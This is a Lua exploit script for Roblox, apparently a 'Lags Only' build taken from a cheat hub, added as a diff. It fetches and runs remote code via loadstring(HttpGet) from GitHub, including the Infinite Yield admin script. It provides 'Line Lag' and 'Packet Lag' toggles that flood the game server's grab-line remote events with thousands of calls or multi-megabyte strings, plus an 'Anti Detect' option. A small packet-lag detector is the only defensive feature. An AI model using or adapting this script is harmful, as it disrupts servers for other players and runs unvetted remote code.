@@ -1,0 +1,217 @@
+-- =====================================================
+-- ★★★ Lags Only (Imo Hub より抽出) ★★★
+-- =====================================================
+
+-- 1. ライブラリとアドオンの読み込み
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
+local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
+local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
+local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
+local Options = Library.Options
+local Toggles = Library.Toggles
+
+-- 2. サービス
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- 3. GrabEvents
+local GrabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
+
+-- 4. 変数
+local packetLagNotifyEnabled = false
+local lastLagSource = false
+local lps = 100
+local linelag = false
+local AntiDetect = false
+local packetLagActive = false
+local packetLagTask = nil
+
+-- 5. Packet Lag Detector
+local function GetSizeMB(StringLength)
+    return StringLength / (1024 * 1024)
+end
+
+local function StartPacketLagDetector()
+    local GE = ReplicatedStorage:WaitForChild("GrabEvents")
+    GE:WaitForChild("ExtendGrabLine").OnClientEvent:Connect(function(arg1, data)
+        if typeof(data) == "string" and not lastLagSource and packetLagNotifyEnabled then
+            local StringLen = string.len(data)
+            if StringLen > 300 then
+                lastLagSource = true
+                local SizeRounded = math.round(GetSizeMB(StringLen) * 1000) / 1000
+                Library:Notify(
+                    "PACKET LAG DETECTED\nSource: " .. tostring(arg1):sub(1, 20) .. "\nSize: " .. tostring(SizeRounded) .. " MB",
+                    5
+                )
+                task.delay(5, function()
+                    lastLagSource = false
+                end)
+            end
+        end
+    end)
+end
+StartPacketLagDetector()
+
+-- =====================================================
+-- 6. Window & UI
+-- =====================================================
+local Window = Library:CreateWindow({
+    Title = "Imo hub - Lags",
+    Footer = "Lags Only Build",
+    Center = true,
+    AutoShow = true,
+    Resizable = true,
+    NotifySide = "Right",
+    ShowCustomCursor = true,
+    ToggleKeybind = Enum.KeyCode.RightShift
+})
+
+local Tabs = {
+    Server = Window:AddTab("Server", "server"),
+    UISettings = Window:AddTab("UI Settings", "settings"),
+}
+
+-- Lags グループのみを残す (左側に配置)
+local LagsGroup = Tabs.Server:AddLeftGroupbox("Lags", "zap")
+
+-- PacketLagDetectorToggle を Lags に追加
+LagsGroup:AddToggle("PacketLagDetectorToggle", {
+    Text = "Packet Lag Detector",
+    Default = false,
+    Callback = function(Value)
+        packetLagNotifyEnabled = Value
+    end
+})
+
+LagsGroup:AddSlider("LPS", {
+    Text = "Lines Per Second",
+    Default = 100,
+    Min = 1,
+    Max = 10000,
+    Rounding = 0,
+    Callback = function(v)
+        lps = v
+    end
+})
+
+LagsGroup:AddToggle("LineLag", {
+    Text = "Line Lag",
+    Default = false,
+    Callback = function(v)
+        linelag = v
+        if v and GrabEvents and GrabEvents:FindFirstChild("CreateGrabLine") then
+            local CreateLine = GrabEvents.CreateGrabLine
+            task.spawn(function()
+                while linelag and GrabEvents and CreateLine do
+                    for i = 1, lps do
+                        pcall(function()
+                            CreateLine:FireServer(
+                                workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn"),
+                                CFrame.new(0, 9e9, 0)
+                            )
+                        end)
+                    end
+                    task.wait(1)
+                end
+            end)
+        end
+    end
+})
+
+-- UI表示用ラベルの追加
+local PacketSizeLabel = LagsGroup:AddLabel("Packet Size: 0.000 MB")
+
+-- MBサイズ計算・表示用関数
+local function UpdatePacketSizeLabel(strength)
+    if PacketSizeLabel then
+        local baseStringLen = string.len("👑YAJUHUB👑") * 100
+        local totalBytes = baseStringLen * strength
+        local sizeMB = totalBytes / (1024 * 1024)
+        PacketSizeLabel:SetText(string.format("Packet Size: %.3f MB", sizeMB))
+    end
+end
+
+LagsGroup:AddSlider("PacketLagStrength", {
+    Text = "Packet Strength",
+    Default = 300,
+    Min = 0,
+    Max = 2500,
+    Rounding = 0,
+    Callback = function(Value)
+        UpdatePacketSizeLabel(Value)
+    end
+})
+
+-- 初期値の計算を適用
+UpdatePacketSizeLabel(2000)
+
+LagsGroup:AddSlider("PacketLagDelay", {
+    Text = "Packet Delay (s)",
+    Default = 1,
+    Min = 0.01,
+    Max = 1,
+    Rounding = 2,
+    Callback = function(Value)
+    end
+})
+
+LagsGroup:AddToggle("AntiDetect", {
+    Text = "Anti Detect (Packets)",
+    Default = false,
+    Callback = function(v)
+        AntiDetect = v
+    end
+})
+
+LagsGroup:AddToggle("PacketLagToggle", {
+    Text = "Packet Lag",
+    Default = false,
+    Callback = function(Value)
+        packetLagActive = Value
+        if Value then
+            Library:Notify("Packet Lag Started", 2)
+            packetLagTask = task.spawn(function()
+                local GE = ReplicatedStorage:WaitForChild("GrabEvents")
+                local ExtendGrabLine = GE:WaitForChild("ExtendGrabLine")
+                while packetLagActive do
+                    local strength = Options.PacketLagStrength.Value
+                    local delay = Options.PacketLagDelay.Value
+                    
+                    local packetString = string.rep("👑YAJUHUB👑", 100 * strength)
+                    
+                    pcall(function()
+                        ExtendGrabLine:FireServer(packetString)
+                    end)
+                    
+                    -- スライダーで設定した間隔で待機
+                    task.wait(delay)
+                end
+            end)
+        else
+            if packetLagTask then
+                task.cancel(packetLagTask)
+                packetLagTask = nil
+            end
+            Library:Notify("Packet Lag Stopped", 2)
+        end
+    end
+})
+
+-- =====================================================
+-- 7. ThemeManager / SaveManager
+-- =====================================================
+ThemeManager:SetLibrary(Library)
+SaveManager:SetLibrary(Library)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
+ThemeManager:SetFolder("Imohub")
+SaveManager:SetFolder("Imohub/LagsOnly")
+SaveManager:SetSubFolder("lags-config")
+ThemeManager:ApplyToTab(Tabs.UISettings)
+SaveManager:BuildConfigSection(Tabs.UISettings)
+SaveManager:LoadAutoloadConfig()
+
+print("Lags Only Build: Loaded ✓")
